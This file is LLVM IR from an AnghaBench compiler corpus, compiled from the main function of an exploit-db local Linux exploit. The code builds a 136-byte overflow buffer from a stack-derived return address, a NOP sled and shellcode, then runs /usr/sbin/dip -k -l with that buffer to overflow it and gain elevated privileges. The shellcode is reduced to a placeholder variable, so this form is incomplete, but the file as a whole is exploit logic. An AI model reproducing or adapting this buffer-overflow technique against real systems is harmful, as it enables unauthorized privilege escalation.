; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19078.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19078.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [18 x i8] c"usage: %s offset\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"\0Ausing: 0x%x\0A\0A\00", align 1
@shellcode = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"/usr/sbin/dip\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"dip\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-k\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-l\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [136 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 2
  br i1 %12, label %13, label %19

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i8* %16)
  %18 = call i32 @exit(i32 0) #3
  unreachable

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @atoi(i8* %22)
  store i32 %23, i32* %8, align 4
  %24 = call i32 (...) @get_sp()
  %25 = load i32, i32* %8, align 4
  %26 = sub nsw i32 %24, %25
  %27 = sext i32 %26 to i64
  store i64 %27, i64* %10, align 8
  store i32 1, i32* %7, align 4
  br label %28

28:                                               ; preds = %37, %19
  %29 = load i32, i32* %7, align 4
  %30 = icmp slt i32 %29, 136
  br i1 %30, label %31, label %40

31:                                               ; preds = %28
  %32 = load i64, i64* %10, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [136 x i8], [136 x i8]* %6, i64 0, i64 %34
  %36 = bitcast i8* %35 to i64*
  store i64 %32, i64* %36, align 1
  br label %37

37:                                               ; preds = %31
  %38 = load i32, i32* %7, align 4
  %39 = add nsw i32 %38, 4
  store i32 %39, i32* %7, align 4
  br label %28

40:                                               ; preds = %28
  %41 = load i64, i64* %10, align 8
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i64 %41)
  store i32 0, i32* %7, align 4
  br label %43

43:                                               ; preds = %57, %40
  %44 = load i32, i32* %7, align 4
  %45 = sext i32 %44 to i64
  %46 = load i32, i32* @shellcode, align 4
  %47 = call i32 @strlen(i32 %46)
  %48 = sext i32 %47 to i64
  %49 = sub i64 136, %48
  %50 = sub i64 %49, 40
  %51 = icmp ult i64 %45, %50
  br i1 %51, label %52, label %60

52:                                               ; preds = %43
  %53 = load i8, i8* @NOP, align 1
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [136 x i8], [136 x i8]* %6, i64 0, i64 %55
  store i8 %53, i8* %56, align 1
  br label %57

57:                                               ; preds = %52
  %58 = load i32, i32* %7, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %7, align 4
  br label %43

60:                                               ; preds = %43
  %61 = getelementptr inbounds [136 x i8], [136 x i8]* %6, i64 0, i64 0
  %62 = load i32, i32* %7, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  %65 = load i32, i32* @shellcode, align 4
  %66 = load i32, i32* @shellcode, align 4
  %67 = call i32 @strlen(i32 %66)
  %68 = call i32 @memcpy(i8* %64, i32 %65, i32 %67)
  %69 = getelementptr inbounds [136 x i8], [136 x i8]* %6, i64 0, i64 0
  %70 = call i32 @execl(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %69, i8* null)
  %71 = load i32, i32* %3, align 4
  ret i32 %71
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
